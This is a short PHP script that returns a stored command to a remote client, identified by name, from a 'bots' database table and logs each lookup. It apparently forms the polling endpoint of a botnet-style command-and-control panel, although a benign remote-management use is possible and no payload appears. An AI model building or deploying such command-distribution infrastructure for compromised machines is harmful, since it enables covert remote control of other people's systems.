<?php
include "../settings/settings.php";

function writeToLog($message) {
    error_log(date('Y-m-d H:i:s') . ": " . $message . "\n", 3, '../logs/commands.log');
}

// Check if the request method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Retrieve POST parameters
    $name = $_POST['name'] ?? null;

    // Log the received parameters
    writeToLog("Received parameters: name=$name");

    // Validate required parameters
    if ($name) {
        // Prepare the SQL statement to fetch cmd_sent
        $stmt = $conn->prepare("SELECT cmd_sent FROM bots WHERE name = ?");
        $stmt->bind_param("s", $name);

        // Execute the statement
        if ($stmt->execute()) {
            $result = $stmt->get_result();
            if ($row = $result->fetch_assoc()) {
                // Output the cmd_sent if found
                $cmd_sent = $row['cmd_sent'];
                echo $cmd_sent;
                writeToLog("Command sent for bot $name: $cmd_sent");
            } else {
                echo json_encode(['status' => 'error', 'message' => 'No commands found for the specified bot.']);
                writeToLog("No commands found for bot: $name");
            }
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Error executing query.']);
            writeToLog("Error executing query for bot: $name");
        }

        // Close the statement
        $stmt->close();
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Missing required parameters']);
        writeToLog("Missing required parameters");
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request method']);
    writeToLog("Invalid request method");
}

// Close the connection
$conn->close();
?>
